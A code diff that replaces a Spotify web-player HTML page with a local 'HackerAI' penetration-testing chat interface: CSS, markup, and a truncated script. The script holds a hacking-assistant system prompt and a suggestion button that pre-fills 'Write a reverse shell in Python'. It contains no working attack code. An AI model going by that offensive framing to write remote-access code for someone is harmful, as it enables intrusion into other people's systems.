@@ -1,62 +1,604 @@
 <!DOCTYPE html>
-<html class="encore-dark-theme encore-layout-themes" lang="en" dir="ltr">
+<html lang="en" class="dark">
 <head>
-<meta charSet="utf-8"/>
-<title>Spotify – Web Player</title>
-<link rel="icon" sizes="32x32" type="image/png" href="https://open.spotifycdn.com/cdn/images/favicon32.b64ecc03.png"/>
-<link rel="icon" sizes="16x16" type="image/png" href="https://open.spotifycdn.com/cdn/images/favicon16.1c487bff.png"/>
-<link rel="icon" href="https://open.spotifycdn.com/cdn/images/favicon.0f31d2ea.ico"/>
-<meta http-equiv="X-UA-Compatible" content="IE=9"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUI-Regular-76c92fb1a35c462f73429fa8865163eb.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
-<link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixMono-Regular-134eeb986fc0f94a9f0acb9cedaeb584.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
-<link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUITitleVariable-08bab3354d40f74e5177917b5ae80894.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
-<link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUI-Bold-09c45a3a0ce9d2971e62cb26e97760fb.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
-<link rel="preload" href="https://encore.scdn.co/fonts/SpotifyMixUITitleVariable-08bab3354d40f74e5177917b5ae80894.woff2" as="font" type="font/woff2" crossorigin="anonymous"/>
-<meta property="og:site_name" content="Spotify"/>
-<meta property="fb:app_id" content="174829003346"/>
-<link rel="canonical" href="https://open.spotify.com/collection/tracks"/>
-<link rel="manifest" href="https://open.spotifycdn.com/cdn/generated/manifest-web-player.1609946b.json"/>
-<style data-styled="active"></style>
-<link rel="stylesheet" href="https://open.spotifycdn.com/cdn/build/web-player/web-player.7e73437f.css"/>
-<link rel="preconnect" href="https://apresolve.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://clienttoken.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://api-partner.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://spclient.wg.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://api.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://daily-mix.scdn.co" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://exp.wg.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://i.scdn.co" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://lineup-images.scdn.co" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://mosaic.scdn.co" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://open.spotifycdn.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://pixel-static.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://pixel.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://pl.scdn.co" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://gew1-dealer.g2.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://gew1-spclient.spotify.com" crossorigin="anonymous"/>
-<link rel="preconnect" href="https://open.spotifycdn.com" crossorigin="anonymous"/>
-<link rel="preload" href="https://open.spotifycdn.com/cdn/generated-locales/web-player/en.a3d6a05a.json" data-translations-url-for-locale="en" as="fetch" crossorigin="anonymous" type="application/json"/>
-<style>.grecaptcha-badge { display: none !important;}</style>
-<script src="https://www.google.com/recaptcha/enterprise.js?render=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39" async="" defer=""></script>
-<link rel="search" type="application/opensearchdescription+xml" title="Spotify" href="https://open.spotifycdn.com/cdn/generated/opensearch.4cd8879e.xml"/>
-<script defer="" src="https://open.spotifycdn.com/cdn/js/gtm.96d60fd6.js"></script>
-<script defer="" src="https://open.spotifycdn.com/cdn/js/retargeting-pixels.02346b5d.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HackerAI Chat - Local</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
+                Ubuntu, Cantarell, sans-serif;
+            background: #0a0a0b;
+            color: #e4e4e7;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chat-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 768px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 0 16px;
+            height: 100vh;
+        }
+
+        .chat-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 20px 0 10px;
+            border-bottom: 1px solid #27272a;
+            flex-shrink: 0;
+        }
+
+        .chat-header svg {
+            width: 28px;
+            height: 28px;
+        }
+
+        .chat-header h1 {
+            font-size: 18px;
+            font-weight: 600;
+            background: linear-gradient(135deg, #a78bfa, #6366f1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .messages-area {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px 0;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            scroll-behavior: smooth;
+        }
+
+        .messages-area::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .messages-area::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .messages-area::-webkit-scrollbar-thumb {
+            background: #3f3f46;
+            border-radius: 3px;
+        }
+
+        .message {
+            display: flex;
+            gap: 12px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .message .avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .message.user .avatar {
+            background: #6366f1;
+            color: #fff;
+        }
+
+        .message.bot .avatar {
+            background: #18181b;
+            border: 1px solid #27272a;
+            color: #a78bfa;
+        }
+
+        .message .bubble {
+            background: #18181b;
+            border: 1px solid #27272a;
+            border-radius: 12px;
+            padding: 12px 16px;
+            max-width: 85%;
+            line-height: 1.6;
+            font-size: 14px;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+
+        .message.user .bubble {
+            background: #1e1b4b;
+            border-color: #312e81;
+            margin-left: auto;
+        }
+
+        .message .bubble p {
+            margin-bottom: 8px;
+        }
+
+        .message .bubble p:last-child {
+            margin-bottom: 0;
+        }
+
+        .message .bubble code {
+            background: #27272a;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+        }
+
+        .message .bubble pre {
+            background: #0f0f11;
+            border: 1px solid #27272a;
+            border-radius: 8px;
+            padding: 12px;
+            overflow-x: auto;
+            margin: 8px 0;
+            font-size: 13px;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+        }
+
+        .typing-indicator {
+            display: flex;
+            gap: 4px;
+            padding: 4px 0;
+        }
+
+        .typing-indicator span {
+            width: 7px;
+            height: 7px;
+            background: #a78bfa;
+            border-radius: 50%;
+            animation: typing 1.4s infinite;
+        }
+
+        .typing-indicator span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .typing-indicator span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes typing {
+            0%,
+            60%,
+            100% {
+                opacity: 0.3;
+                transform: scale(0.8);
+            }
+            30% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .input-area {
+            flex-shrink: 0;
+            padding: 12px 0 20px;
+            border-top: 1px solid #27272a;
+            margin-top: auto;
+        }
+
+        .input-wrapper {
+            display: flex;
+            gap: 8px;
+            background: #18181b;
+            border: 1px solid #27272a;
+            border-radius: 12px;
+            padding: 4px;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrapper:focus-within {
+            border-color: #6366f1;
+        }
+
+        .input-wrapper textarea {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #e4e4e7;
+            font-size: 14px;
+            padding: 10px 12px;
+            resize: none;
+            font-family: inherit;
+            line-height: 1.5;
+            max-height: 120px;
+        }
+
+        .input-wrapper textarea::placeholder {
+            color: #71717a;
+        }
+
+        .input-wrapper button {
+            background: #6366f1;
+            border: none;
+            border-radius: 8px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            flex-shrink: 0;
+            align-self: flex-end;
+            transition: background 0.2s, transform 0.1s;
+        }
+
+        .input-wrapper button:hover {
+            background: #4f46e5;
+        }
+
+        .input-wrapper button:active {
+            transform: scale(0.95);
+        }
+
+        .input-wrapper button:disabled {
+            background: #3f3f46;
+            cursor: not-allowed;
+        }
+
+        .input-wrapper button svg {
+            width: 18px;
+            height: 18px;
+            color: #fff;
+        }
+
+        .welcome-message {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            text-align: center;
+            gap: 12px;
+        }
+
+        .welcome-message .logo-big svg {
+            width: 48px;
+            height: 48px;
+            color: #6366f1;
+        }
+
+        .welcome-message h2 {
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        .welcome-message p {
+            color: #a1a1aa;
+            font-size: 14px;
+            max-width: 320px;
+        }
+
+        .suggestions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            justify-content: center;
+            margin-top: 8px;
+        }
+
+        .suggestions button {
+            background: #18181b;
+            border: 1px solid #27272a;
+            color: #a1a1aa;
+            padding: 8px 14px;
+            border-radius: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .suggestions button:hover {
+            border-color: #6366f1;
+            color: #e4e4e7;
+            background: #1e1b4b;
+        }
+    </style>
 </head>
-<body class="">
-<div class="body-drag-top"></div>
+<body>
 
-<script id="appServerConfig" type="text/plain">eyJhcHBOYW1lIjoid2ViX3BsYXllcl9wcm90b3R5cGUiLCJtYXJrZXQiOiJBWiIsImxvY2FsZSI6eyJsb2NhbGUiOiJlbiIsInJ0bCI6ZmFsc2UsInRleHREaXJlY3Rpb24iOiJsdHIifSwidXNlckNvdW50cnkiOiJBWiIsImlzUHJlbWl1bSI6ZmFsc2UsImNvcnJlbGF0aW9uSWQiOiJjZDNmOTA3NS00YWRmLTQxYTYtODI3Zi0zN2VlNTBlM2ZhNjkiLCJpc0Fub255bW91cyI6ZmFsc2UsImd0bUlkIjoiR1RNLVBaSE4zVkQiLCJwaXBSZXNvdXJjZXMiOnsic2NyaXB0cyI6WyJodHRwczovL29wZW4uc3BvdGlmeWNkbi5jb20vY2RuL2J1aWxkL3dlYi1wbGF5ZXIvdmVuZG9yfndlYi1wbGF5ZXIuZjNlNDg0MjYuanMiLCJodHRwczovL29wZW4uc3BvdGlmeWNkbi5jb20vY2RuL2J1aWxkL3dlYi1wbGF5ZXIvcGlwLW1pbmktcGxheWVyLjk1OTJkNDIzLmpzIl0sInN0eWxlcyI6WyJodHRwczovL29wZW4uc3BvdGlmeWNkbi5jb20vY2RuL2J1aWxkL3dlYi1wbGF5ZXIvcGlwLW1pbmktcGxheWVyLjVjMDI4YTc3LmNzcyJdfSwicmV0YXJnZXRpbmdQaXhlbHMiOm51bGwsInJlY2FwdGNoYVdlYlBsYXllckZyYXVkU2l0ZUtleSI6IjZMZkNWTEFVQUFBQUFMRnd3Um5uQ0oxMkRhbHJpVUdiajhGV19KMzkiLCJzZXJ2ZXJUaW1lIjoxNzgzOTUzODgyLCJjbGllbnRWZXJzaW9uIjoiMS4yLjk1Ljk5LmdiZjU0ODg0ZSIsImJ1aWxkVmVyc2lvbiI6IndlYi1wbGF5ZXJfMjAyNi0wNy0xM18xNzgzOTUzMTczODc0X2JmNTQ4ODQiLCJidWlsZERhdGUiOiIyMDI2LTA3LTEzIn0=</script>
+    <div class="chat-container">
+        <!-- Header -->
+        <div class="chat-header">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10" />
+                <path d="M12 6v6l4 2" />
+            </svg>
+            <h1>HackerAI Chat</h1>
+        </div>
 
-<script id="featureFlags" type="text/plain">eyJlbmFibGVTaG93cyI6dHJ1ZX0=</script>
+        <!-- Messages -->
+        <div class="messages-area" id="messages"></div>
 
-<script id="seoExperiments" type="text/plain">eyJjb2xsZWN0aW9uIjp7fX0=</script>
+        <!-- Input -->
+        <div class="input-area">
+            <div class="input-wrapper">
+                <textarea id="input" rows="1" placeholder="Message HackerAI..."></textarea>
+                <button id="sendBtn" disabled>
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M5 12h14" />
+                        <path d="m12 5 7 7-7 7" />
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
 
-<script id="remoteConfig" type="text/plain">eyIjdiI6IjEiLCJlbmFibGVNb3N0UmVhZEx5cmljc0R3cCI6ImNvbnRyb2wiLCJlbmFibGVTdWJ0aXRsZXNVc2luZ0hhcm1vbnkiOnRydWUsImVuYWJsZUZ1bGxzY3JlZW5Nb2RlIjp0cnVlLCJlbmFibGVOcHZBYm91dFBvZGNhc3QiOnRydWUsImVuYWJsZUx5cmljc1Vwc2VsbCI6dHJ1ZSwiZW5hYmxlQWRhcHRpdmVUaXRsZUVudGl0aWVzIjp0cnVlLCJlbmFibGVDb25jZXJ0c1JlcG9ydElzc3VlIjp0cnVlLCJlbmFibGVDb25jZXJ0RGlzdGFuY2VSYWRpdXMiOnRydWUsImVuYWJsZUltcHJvdmVkQ2luZW1hTW9kZUNhbnZhcyI6dHJ1ZSwiZW5hYmxlTmF2aWdhdGVUb0dhbGxlcnlGcm9tQ29uY2VwdFBpbGwiOnRydWUsImVuYWJsZVN0cnVjdHVyZWREZXNjcmlwdGlvbkh0bWwiOnRydWUsImVuYWJsZUV4Y2x1ZGVUcmFja0Zyb21UYXN0ZVByb2ZpbGUiOnRydWUsImVuYWJsZUJ1eU9wdGlvbkluQXVkaW9ib29rQ29udGV4dE1lbnUiOnRydWUsImVuYWJsZUxpc3RlbmluZ1N0YXRzTW9kYWwiOnRydWUsImVuYWJsZU5vdGlmaWNhdGlvbkNlbnRlciI6dHJ1ZSwiZW5hYmxlUGVla05wdiI6dHJ1ZSwiZW5hYmxlTWFncGllIjp0cnVlLCJlbmFibGVPdXRyb1ByZXZpZXdSZXBvcnRpbmciOiJQUk9EVUNUSU9OIiwiZW5hYmxlV2F0Y2hGZWVkUHJldmlld1JlcG9ydGluZyI6dHJ1ZSwiZW5hYmxlMURDYXJkUHJldmlld1JlcG9ydGluZyI6dHJ1ZSwiZW5hYmxlVXNlclZpZGVvU2V0dGluZ3MiOnRydWUsImVuYWJsZUFsYnVtUHJlcmVsZWFzZUFzTmF0aXZlQWxidW1FbnRyeVBvaW50cyI6dHJ1ZSwiZW5hYmxlQWxidW1QcmVyZWxlYXNlQXNOYXRpdmVBbGJ1bVNoYXJlVXJsIjoiYWxidW1fdXJpIiwiZW5hYmxlVGVudHBvbGVDdXJhdGlvbiI6dHJ1ZSwiZW5hYmxlQ29udGVudEV4cGVyaWVuY2VQbGF5ZXJDb250cm9scyI6dHJ1ZSwiZW5hYmxlWW91ckFsbFRpbWVUb3BTb25nc1N0cmVhbUNvdW50cyI6dHJ1ZSwiaXNWaWRlb1F1YWxpdHlFbmFibGVkIjp0cnVlLCJlbmFibGVBbGJ1bVByZXJlbGVhc2VBc05hdGl2ZUFsYnVtUHJlU2F2ZVVyaSI6ImFsYnVtX3VyaSIsImVuYWJsZUFsYnVtUHJlcmVsZWFzZUFzTmF0aXZlQWxidW1FbnRyeVBvaW50c1NlYXJjaCI6dHJ1ZSwiZW5hYmxlRGVza3RvcE9uYm9hcmRpbmdDaGVja2xpc3QiOiJuYXYtYW5kLWhvbWUiLCJlbmFibGVBc3Npc3RlZEN1cmF0aW9uVHJhaXRSb3dzIjp0cnVlLCJlbmFibGVQcmVtaXVtUGFnZSI6dHJ1ZSwiZW5hYmxlTWFuZGFsb3JpYW5FYXN0ZXJFZ2ciOiJIRUxNRVRfQU5EX1NPVU5EIiwiZW5hYmxlVmlld01vZGUiOnRydWUsImVuYWJsZUNvbmNlcnRzTmVhcllvdSI6dHJ1ZSwiZW5hYmxlRmVlZEJhc2VsaW5lVHJhbnNjcmlwdHMiOnRydWUsImVuYWJsZUZlZWRCYXNlbGluZVZpZGVvUHJldmlld3MiOnRydWUsImVuYWJsZUZlZWRCYXNlbGluZUF1ZGlvUHJldmlld3MiOnRydWUsImVuYWJsZUF1ZGlvYm9va0NhcmRQbGF5QnV0dG9uIjp0cnVlLCJlbmFibGVZTFhQcmVyZWxlYXNlQWxidW1zIjp0cnVlLCJlbmFibGVQdXNoQ2luZW1hTW9kZVN0YXRlVG9IaXN0b3J5Ijp0cnVlLCJlbmFibGVGdWxsc2NyZWVuTGlicmFyeSI6dHJ1ZSwiZW5hYmxlTnB2Q3JlZGl0c0ltcHJlc3Npb25zIjp0cnVlLCJlbmFibGVXZWJUb0Rlc2t0b3BGdW5uZWwiOnRydWUsImVuYWJsZVRPVFBWZXJzaW9uVmFsaWRhdGlvbiI6dHJ1ZSwiZW5hYmxlQ29uY2VydHNOb3RJbnRlcmVzdGVkIjp0cnVlLCJlbmFibGVWZW51ZVBhZ2VHZW5yZXMiOnRydWUsImVuYWJsZVZlbnVlUGFnZUZvbGxvdyI6dHJ1ZSwiZW5hYmxlVmVudWVzSW5Zb3VyTGlicmFyeSI6dHJ1ZSwiZW5hYmxlUHJlZmV0Y2hpbmciOnRydWUsImVuYWJsZVdhdGNoRmVlZCI6dHJ1ZSwiZW5hYmxlV2F0Y2hGZWVkRW50aXR5UGFnZXMiOnRydWUsImVuYWJsZUF1dG9QbGF5T25Mb2FkIjp0cnVlLCJlcGlzb2RlVHJhbnNjcmlwdFRhYlNvdXJjZSI6IlJFQURfQUxPTkciLCJlbmFibGVTbWFydFNodWZmbGUiOnRydWUsImVuYWJsZUNlbnRyYWxpc2VkU21hcnRTaHVmZmxlIjp0cnVlLCJlbmFibGVVc2VyQ29tbWVudHNGb3JFcGlzb2RlcyI6dHJ1ZSwicmVhbGx5RW5hYmxlVW5pZmllZFNtYXJ0U2h1ZmZsZVNpZ25hbHMiOnRydWUsImVuYWJsZVZpZGVvVGh1bWJuYWlsU2NydWJiaW5nIjp0cnVlLCJlbmFibGVOZXdSZWNlbnRzUGFnZSI6dHJ1ZSwiZW5hYmxlSG9tZUZvbGxvd2luZ1N1YmZlZWRzIjp0cnVlLCJlbmFibGVSZWdpc3RlcmVkQXJ0aXN0QmFubmVyIjp0cnVlLCJlbmFibGVEeW5hbWljTGl2ZUV2ZW50c0ZlZWQiOnRydWUsImVuYWJsZVJhdGVhYmlsaXR5VHJhaXRDaGVjayI6dHJ1ZSwiZW5hYmxlU2VhcmNoUmVzdWx0c0FzTGlzdCI6IkxJU1RfV0lUSF9UT1BfUkVTVUxUIiwiZW5hYmxlU2VhcmNoU3VnZ2VzdGlvbnMiOnRydWUsImVuYWJsZVZlcmlmaWVkQnlTcG90aWZ5Ijp0cnVlLCIjY29uZmlndXJhdGlvbkFzc2lnbm1lbnRJZCI6IjVhZWMyMjRmLWQwODktNjMxOC1mZjliLTg0YTljOTg1NDc4MzoyOTM5NTQ4IiwiI2dyb3VwSWRzIjp7ImVuYWJsZU1vc3RSZWFkTHlyaWNzRHdwIjoxMjkxMTA1LCJlbmFibGVTdWJ0aXRsZXNVc2luZ0hhcm1vbnkiOjM1NTE5LCJlbmFibGVGdWxsc2NyZWVuTW9kZSI6MzEyNDc5LCJlbmFibGVOcHZBYm91dFBvZGNhc3QiOjExMzA1OTUsImVuYWJsZUx5cmljc1Vwc2VsbCI6MTE3MTUyNCwiZW5hYmxlQWRhcHRpdmVUaXRsZUVudGl0aWVzIjoxMjAyOTY4LCJlbmFibGVDb25jZXJ0c1JlcG9ydElzc3VlIjoxMjI1MzA1LCJlbmFibGVDb25jZXJ0RGlzdGFuY2VSYWRpdXMiOjEyMjcxNDIsImVuYWJsZUltcHJvdmVkQ2luZW1hTW9kZUNhbnZhcyI6MTIzMzQ4MiwiZW5hYmxlQW1iaWVudE1vZGVUaW1lciI6MTIzMzQ4MiwiZW5hYmxlTmF2aWdhdGVUb0dhbGxlcnlGcm9tQ29uY2VwdFBpbGwiOjEyNDQwNzEsImVuYWJsZVN0cnVjdHVyZWREZXNjcmlwdGlvbkh0bWwiOjEyNTMxMDAsImVuYWJsZUV4Y2x1ZGVUcmFja0Zyb21UYXN0ZVByb2ZpbGUiOjEyNjU0NjksImVuYWJsZUJ1eU9wdGlvbkluQXVkaW9ib29rQ29udGV4dE1lbnUiOjEyNjkxMTgsImVuYWJsZUxpc3RlbmluZ1N0YXRzTW9kYWwiOjEyNjU5OTIsImVuYWJsZU5vdGlmaWNhdGlvbkNlbnRlciI6MTI3NTU5NSwiZW5hYmxlUGVla05wdiI6MTI3NjY0NiwiZW5hYmxlTWFncGllIjoxMjgwMjM5LCJlbmFibGVPdXRyb1ByZXZpZXdSZXBvcnRpbmciOjEyOTI5OTgsImVuYWJsZVdhdGNoRmVlZFByZXZpZXdSZXBvcnRpbmciOjEyOTI5OTgsImVuYWJsZTFEQ2FyZFByZXZpZXdSZXBvcnRpbmciOjEyOTI5OTgsImVuYWJsZVVzZXJWaWRlb1NldHRpbmdzIjoxMzAwODc5LCJlbmFibGVBbGJ1bVByZXJlbGVhc2VBc05hdGl2ZUFsYnVtRW50cnlQb2ludHMiOjEyOTcyODcsImVuYWJsZUFsYnVtUHJlcmVsZWFzZUFzTmF0aXZlQWxidW1TaGFyZVVybCI6MTI5NzI5MSwiZW5hYmxlVGVudHBvbGVDdXJhdGlvbiI6MTMwNTE2MSwiZW5hYmxlQ29udGVudEV4cGVyaWVuY2VQbGF5ZXJDb250cm9scyI6MTMwNTE2MSwiZW5hYmxlTGlrZWRTb25nc0xpc3RQbGF0Zm9ybSI6MTMwNTE2MSwiZW5hYmxlWW91ckFsbFRpbWVUb3BTb25nc1N0cmVhbUNvdW50cyI6MTMwNjM4MywiaXNWaWRlb1F1YWxpdHlFbmFibGVkIjoxMzA4NzY4LCJlbmFibGVBbGJ1bVByZXJlbGVhc2VBc05hdGl2ZUFsYnVtUHJlU2F2ZVVyaSI6MTMwOTQ0MiwiZW5hYmxlQWxidW1QcmVyZWxlYXNlQXNOYXRpdmVBbGJ1bUVudHJ5UG9pbnRzU2VhcmNoIjoxMzA1MTQyLCJlbmFibGVEZXNrdG9wT25ib2FyZGluZ0NoZWNrbGlzdCI6MTMxMjAwMiwiZW5hYmxlQXNzaXN0ZWRDdXJhdGlvblRyYWl0Um93cyI6MTMxNzE4MSwiZW5hYmxlUHJlbWl1bVBhZ2UiOjExNzMzNzQsImVuYWJsZU1hbmRhbG9yaWFuRWFzdGVyRWdnIjoxMTg5NDY0LCJlbmFibGVWaWV3TW9kZSI6MTE4OTcwOSwiZW5hYmxlUmVhY3RRdWVyeVBlcnNpc3RlbmNlIjoxMjE5MjA3LCJlbmFibGVDb25jZXJ0c05lYXJZb3UiOjEyMzEwODcsImVuYWJsZUZlZWRCYXNlbGluZVRyYW5zY3JpcHRzIjoxMjI1MDA3LCJlbmFibGVGZWVkQmFzZWxpbmVWaWRlb1ByZXZpZXdzIjoxMjI1MDA3LCJlbmFibGVGZWVkQmFzZWxpbmVBdWRpb1ByZXZpZXdzIjoxMjI1MDA3LCJlbmFibGVBdWRpb2Jvb2tDYXJkUGxheUJ1dHRvbiI6MTIyOTY2OSwiZW5hYmxlWUxYUHJlcmVsZWFzZUFsYnVtcyI6MTIzNTEwMSwiZW5hYmxlUHVzaENpbmVtYU1vZGVTdGF0ZVRvSGlzdG9yeSI6MTIzNzkyNiwiZW5hYmxlRnVsbHNjcmVlbkxpYnJhcnkiOjEyMzc5MjYsImVuYWJsZU5wdkNyZWRpdHNJbXByZXNzaW9ucyI6MTIzODg3NywiZW5hYmxlV2ViVG9EZXNrdG9wRnVubmVsIjoxMjQyNDEyLCJlbmFibGVUT1RQVmVyc2lvblZhbGlkYXRpb24iOjEyNDc1ODAsImVuYWJsZUNvbmNlcnRzTm90SW50ZXJlc3RlZCI6MTI1MDIwNiwiZW5hYmxlVmVudWVQYWdlR2VucmVzIjoxMjY0MDc3LCJlbmFibGVWZW51ZVBhZ2VGb2xsb3ciOjEyNjQwNzcsImVuYWJsZVZlbnVlc0luWW91ckxpYnJhcnkiOjEyNjQwNzcsImVuYWJsZVByZWZldGNoaW5nIjoxMjY1NzU2LCJlbmFibGVXYXRjaEZlZWQiOjEyNjcwNzMsImVuYWJsZVdhdGNoRmVlZEVudGl0eVBhZ2VzIjoxMjY3MDczLCJlbmFibGVBdXRvUGxheU9uTG9hZCI6MTI3NDkzOSwiZXBpc29kZVRyYW5zY3JpcHRUYWJTb3VyY2UiOjEwMDAwMjE1LCJlbmFibGVTbWFydFNodWZmbGUiOjEwMDAwMjY0LCJlbmFibGVDZW50cmFsaXNlZFNtYXJ0U2h1ZmZsZSI6MTAwMDAyNjQsImVuYWJsZVVzZXJDb21tZW50c0ZvckVwaXNvZGVzIjoxMDAwMDMzMywicmVhbGx5RW5hYmxlVW5pZmllZFNtYXJ0U2h1ZmZsZVNpZ25hbHMiOjEwMDAxMTQ0LCJlbmFibGVWaWRlb1RodW1ibmFpbFNjcnViYmluZyI6MTAwNDQ5MDYsImVuYWJsZU5ld1JlY2VudHNQYWdlIjoxMDA0NTEwOCwiZW5hYmxlSG9tZUZvbGxvd2luZ1N1YmZlZWRzIjoxMDA0NTEwOSwiZW5hYmxlUmVnaXN0ZXJlZEFydGlzdEJhbm5lciI6MTAwNDUyNzQsImVuYWJsZUR5bmFtaWNMaXZlRXZlbnRzRmVlZCI6MTAwNDU2MTQsImVuYWJsZVJhdGVhYmlsaXR5VHJhaXRDaGVjayI6MTAwNDYzNzQsImVuYWJsZVNlYXJjaFJlc3VsdHNBc0xpc3QiOjEwMDUwNTA1LCJlbmFibGVTZWFyY2hTdWdnZXN0aW9ucyI6MTAwNTExNzIsImVuYWJsZVZlcmlmaWVkQnlTcG90aWZ5IjoxMDA1ODAzNSwiZW5hYmxlQWdlQXNzdXJhbmNlTG9jYWxGbG93IjoxMDA2Njc5NCwiZW5hYmxlQWdlQXNzdXJhbmNlMThQbHVzUG9kY2FzdEVwaXNvZGVWaWRlb3MiOjEwMDY2ODA1fSwiI2ZldGNoVGltZU1pbGxpcyI6MTc4Mzk1Mzg4MjIzNiwiI2NvbnRleHRIYXNoIjoiNTA0MGJmNTI3YTU4OTMyZSJ9</script>
+    <script>
+        // ============================================================
+        //  HackerAI Local Chat — tam işlək, token/giriş tələb olunmur
+        // ============================================================
 
-<script src="https://open.spotifycdn.com/cdn/build/web-player/web-player.c99655dc.js"></script>
-<script src="https://open.spotifycdn.com/cdn/build/web-player/vendor~web-player.f3e48426.js"></script>
-<script src="https://open.spotifycdn.com/cdn/build/web-player/encore~web-player.22454682.js"></script>
+        const messagesEl = document.getElementById('messages');
+        const inputEl = document.getElementById('input');
+        const sendBtn = document.getElementById('sendBtn');
+
+        // Conversation history (context)
+        let history = [
+            {
+                role: 'system',
+                content: 'You are HackerAI, an AI penetration testing assistant. You help with cybersecurity, vulnerabilities, exploits, and ethical hacking. Answer concisely and accurately.'
+            }
+        ];
+
+        // --- Helpers ---
+        function autoResize() {
+            inputEl.style.height = 'auto';
+            inputEl.style.height = Math.min(inputEl.scrollHeight, 120) + 'px';
+        }
+
+        function showWelcome() {
+            messagesEl.innerHTML = `
+                <div class="welcome-message">
+                    <div class="logo-big">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"/>
+                            <path d="M12 6v6l4 2"/>
+                        </svg>
+                    </div>
+                    <h2>How can I help you today?</h2>
+                    <p>I'm your AI penetration testing assistant. Ask me about vulnerabilities, exploits, or security assessments.</p>
+                    <div class="suggestions">
+                        <button onclick="suggest('Scan a target for open ports')">Scan a target</button>
+                        <button onclick="suggest('Explain SQL injection')">SQL injection</button>
+                        <button onclick="suggest('Check for XSS vulnerability')">XSS check</button>
+                        <button onclick="suggest('Write a reverse shell in Python')">Reverse shell</button>
+                    </div>
+                </div>
+            `;
+        }
+
+        function suggest(text) {
+            inputEl.value = text;
+            autoResize();
+            inputEl.focus();
+        }
+
+        function addMessage(role, content) {
+            // Remove welcome if it exists
+            const welcome = messagesEl.querySelector('.welcome-message');
+            if (welcome) welcome.remove();
+
+            const div = document.createElement('div');
+            div.className = `message ${role}`;
+
+            const avatar = document.createElement('div');
+            avatar.className = 'avatar';
+            avatar.textContent = role === 'user' ? 'U' : 'H';
+
+            const bubble = document.createElement('div');
+            bubble.className = 'bubble';
+            // Simple markdown-style formatting
+            bubble.innerHTML = formatMessage(content);
+
+            div.appendChild(avatar);
+            div.appendChild(bubble);
+            messagesEl.appendChild(div);
+            messagesEl.scrollTop = messagesEl.scrollHeight;
+        }
+
+        function formatMessage(text) {
+            // Escape HTML
+            let html = text
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
